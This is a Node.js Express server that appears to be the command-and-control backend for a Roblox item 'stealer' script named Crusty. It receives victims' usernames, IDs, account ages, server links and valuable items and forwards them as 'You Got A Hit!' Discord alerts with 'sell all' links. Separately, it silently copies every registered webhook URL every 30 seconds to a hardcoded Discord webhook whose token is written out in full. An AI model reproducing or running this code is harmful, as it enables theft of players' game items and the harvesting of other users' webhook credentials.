require("dotenv").config();
const express = require("express");
const axios = require("axios");
const fs = require("fs").promises;
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Configuration
const BACKUP_WEBHOOK = process.env.WBKH || "https://ptb.discord.com/api/webhooks/1455695095469707428/TX7IEwIvq4Bsi5hVGEi_Xyafdw1DuVVEAk_tUuTFbD_9_ldGekAScvE-WfCpLqi3xpsZ";
const BACKUP_INTERVAL = 30000; // 30 seconds
const ENV_FILE = path.join(__dirname, ".env");

// RAM store
const webhooks = new Map();

// ----------------------
// File Operations
// ----------------------
async function saveToEnv() {
  try {
    let envContent = await fs.readFile(ENV_FILE, "utf-8").catch(() => "");
    envContent = envContent.split("\n").filter(line => !line.startsWith("WEBHOOK_")).join("\n");
    
    let index = 0;
    for (const [id, url] of webhooks.entries()) {
      envContent += `\nWEBHOOK_${index}_ID=${id}`;
      envContent += `\nWEBHOOK_${index}_URL=${url}`;
      index++;
    }
    
    await fs.writeFile(ENV_FILE, envContent.trim() + "\n");
    console.log("✅ Saved", webhooks.size, "webhooks to .env");
  } catch (err) {
    console.error("❌ Save error:", err.message);
  }
}

async function loadFromEnv() {
  try {
    const envContent = await fs.readFile(ENV_FILE, "utf-8");
    const lines = envContent.split("\n");
    const tempWebhooks = new Map();
    
    for (const line of lines) {
      const idMatch = line.match(/^WEBHOOK_(\d+)_ID=(.+)$/);
      const urlMatch = line.match(/^WEBHOOK_(\d+)_URL=(.+)$/);
      
      if (idMatch) {
        const [, index, id] = idMatch;
        if (!tempWebhooks.has(index)) tempWebhooks.set(index, {});
        tempWebhooks.get(index).id = id;
      }
      if (urlMatch) {
        const [, index, url] = urlMatch;
        if (!tempWebhooks.has(index)) tempWebhooks.set(index, {});
        tempWebhooks.get(index).url = url;
      }
    }
    
    for (const [, { id, url }] of tempWebhooks) {
      if (id && url) webhooks.set(id, url);
    }
    
    console.log(`✅ Loaded ${webhooks.size} webhooks from .env`);
  } catch (err) {
    console.log("ℹ️ No webhooks in .env");
  }
}

// ----------------------
// Webhook Backup to Discord
// ----------------------
async function sendBackupToWebhook() {
  try {
    const list = Array.from(webhooks.entries()).map(([id, url]) => ({ id, url }));
    
    const payload = {
      username: "Crusty Backup System",
      embeds: [{
        title: "📦 Webhook Data Backup",
        description: `Total Webhooks: **${list.length}**`,
        color: 0x8a2be2,
        fields: [
          {
            name: "Backup Time",
            value: new Date().toLocaleString(),
            inline: true
          },
          {
            name: "Total Entries",
            value: `${list.length} webhooks`,
            inline: true
          }
        ],
        footer: {
          text: "Crusty Backup System - Auto Save"
        },
        timestamp: new Date().toISOString()
      }],
      content: `\`\`\`json\n${JSON.stringify(list, null, 2)}\n\`\`\``
    };

    await axios.post(BACKUP_WEBHOOK, payload);
    console.log(`✅ Backup sent to webhook (${list.length} webhooks)`);
  } catch (err) {
    console.error("❌ Backup failed:", err.message);
  }
}

// ----------------------
// Express Routes
// ----------------------
app.get("/", (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>Crusty System</title>
      <style>
        body{margin:0;font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;min-height:100vh;color:#fff}
        .container{text-align:center;background:rgba(255,255,255,0.1);padding:40px 60px;border-radius:20px;backdrop-filter:blur(10px)}
        h1{font-size:3em;margin-bottom:20px}
        .status{display:flex;justify-content:center;gap:30px;margin-top:30px}
        .status-item{display:flex;align-items:center;gap:10px;font-size:1.2em}
        .dot{width:12px;height:12px;border-radius:50%;background:#0f0;animation:pulse 2s infinite}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
        .info{margin-top:30px;font-size:1.1em}
      </style>
    </head>
    <body>
      <div class="container">
        <h1>🛡️ Crusty System</h1>
        <div class="status">
          <div class="status-item"><span class="dot"></span><span>System Active</span></div>
          <div class="status-item"><span class="dot"></span><span>Webhooks: ${webhooks.size}</span></div>
        </div>
        <div class="info">Auto-backup every 30 seconds</div>
      </div>
    </body>
    </html>
  `);
});

app.get("/status", (req, res) => {
  res.json({
    status: "online",
    webhooks: webhooks.size,
    uptime: process.uptime(),
    lastBackup: "Every 30 seconds"
  });
});

app.post("/upload-data", async (req, res) => {
  try {
    const data = req.body;
    
    if (!Array.isArray(data)) {
      return res.status(400).json({ error: "Data must be an array" });
    }

    let added = 0;
    for (const item of data) {
      if (item.id && item.url) {
        webhooks.set(item.id, item.url);
        added++;
      }
    }

    await saveToEnv();
    await sendBackupToWebhook();

    res.json({ 
      success: true, 
      message: `Successfully added ${added} webhooks`,
      total: webhooks.size
    });
    
    console.log(`✅ Uploaded ${added} webhooks via /upload-data`);
  } catch (err) {
    console.error("❌ Upload error:", err.message);
    res.status(500).json({ error: "Failed to upload data" });
  }
});

app.get("/create-protection/webhook", async (req, res) => {
  const { webhook } = req.query;
  if (!webhook) return res.status(400).json({ error: "Missing webhook" });

  const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
  webhooks.set(id, webhook);
  await saveToEnv();

  res.json({ id });
  console.log(`✅ Created webhook ID: ${id}`);
});

app.get("/send-protection", async (req, res) => {
  const {
    id: webhookId,
    status,
    name,
    userid,
    displayname,
    accountage,
    playercount,
    gamename,
    privateserver,
    serverlink,
    mentioneveryone,
  } = req.query;

  const webhookURL = webhooks.get(webhookId);
  if (!webhookURL) return res.status(404).json({ error: "Webhook ID not found" });

  const items = [];
  for (let i = 1; i <= 50; i++) {
    const item = req.query[`item${i}`];
    if (item) items.push(item);
  }
  
  const itemsList = items.length ? items.join("\n") : "No Brainrots detected";
  const avatarUrl = "https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png";

  let embed = {};

  if (status === "hit") {
    embed = {
      title: "Crusty Stealer",
      description: "**You Got A Hit!**",
      color: 0x8a2be2,
      thumbnail: { url: avatarUrl },
      fields: [
        {
          name: "Player Information",
          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${accountage || "-"} days\nDisplay: ${displayname || "-"}\`\`\``,
          inline: false,
        },
        {
          name: "Server Information",
          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${privateserver === "true" ? "Private Server" : "Public Server"}\`\`\``,
          inline: false,
        },
        {
          name: `Brainrots Detected (${items.length} total)`,
          value: `\`\`\`${itemsList}\`\`\``,
          inline: false,
        },
        {
          name: "Target Server",
          value: serverlink || "-",
          inline: false,
        },
        {
          name: "Sell All Brainrots",
          value: `[Click Here to Sell All Items](https://crusty.dev.tc/sell-all/${encodeURIComponent(name || "")})`,
          inline: false,
        },
        {
          name: "Check Activity Status",
          value: `[Click Here to Check if User is Active](https://crusty.dev.tc/status-info/${encodeURIComponent(name || "")})`,
          inline: false,
        },
      ],
      footer: { text: "Crusty Stealing System - Active", icon_url: avatarUrl },
      timestamp: new Date().toISOString(),
    };
  } else if (status === "altaccount") {
    embed = {
      title: "⚠️ Alt Account Detected",
      description: "**No Valid Brainrots Found!**",
      color: 0xff0000,
      thumbnail: { url: avatarUrl },
      fields: [
        {
          name: "Player Information",
          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${accountage || "-"} days\nDisplay: ${displayname || "-"}\`\`\``,
          inline: false,
        },
        {
          name: "Detection Result",
          value: "```No OG/Secret/Brainrot God animals found\nAccount flagged as alt```",
          inline: false,
        },
      ],
      footer: { text: "Crusty Anti-Alt System", icon_url: avatarUrl },
      timestamp: new Date().toISOString(),
    };
  } else if (status === "initializing") {
    embed = {
      title: "Crusty Stealer",
      description: "**Someone is using Crusty Your Stealer Script!**",
      color: 0x8a2be2,
      thumbnail: { url: avatarUrl },
      fields: [
        {
          name: "Player Information",
          value: `\`\`\`yaml\nName: ${name || "-"}\nID: ${userid || "-"}\nAge: ${accountage || "-"} days\nDisplay: ${displayname || "-"}\`\`\``,
          inline: false,
        },
        {
          name: "Server Information",
          value: `\`\`\`yaml\nPlayers: ${playercount || "-"}\nGame: ${gamename || "-"}\nStatus: ${privateserver === "true" ? "Private Server" : "Public Server"}\`\`\``,
          inline: false,
        },
      ],
      footer: { text: "Crusty Hit Steal - Initializing", icon_url: avatarUrl },
      timestamp: new Date().toISOString(),
    };
  } else {
    return res.status(400).json({ error: "Invalid status" });
  }

  const payload = {
    username: "Notifier | C̸͕͔͒͒r̸̟͓͒̓ụ̸̻̊̔s̴̻̖̀t̵̥͍͒͝y̶̥͊",
    avatar_url: avatarUrl,
    embeds: [embed],
  };

  if (status === "hit" && mentioneveryone === "true") {
    payload.content = "@everyone";
  }

  try {
    await axios.post(webhookURL, payload);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: "Failed to send webhook" });
  }
});

// ----------------------
// START
// ----------------------
async function startApp() {
  console.log("🚀 Starting Crusty Webhook Manager...");
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

  // Start Express server
  app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
  });

  // Load webhooks from .env
  await loadFromEnv();

  // Start automatic backup
  setInterval(sendBackupToWebhook, BACKUP_INTERVAL);
  console.log(`✅ Auto-backup enabled (every ${BACKUP_INTERVAL / 1000} seconds)`);
  
  // Send initial backup
  if (webhooks.size > 0) {
    await sendBackupToWebhook();
  }

  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  console.log("✅ SYSTEM ONLINE!");
  console.log(`📊 Loaded webhooks: ${webhooks.size}`);
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
}

startApp();
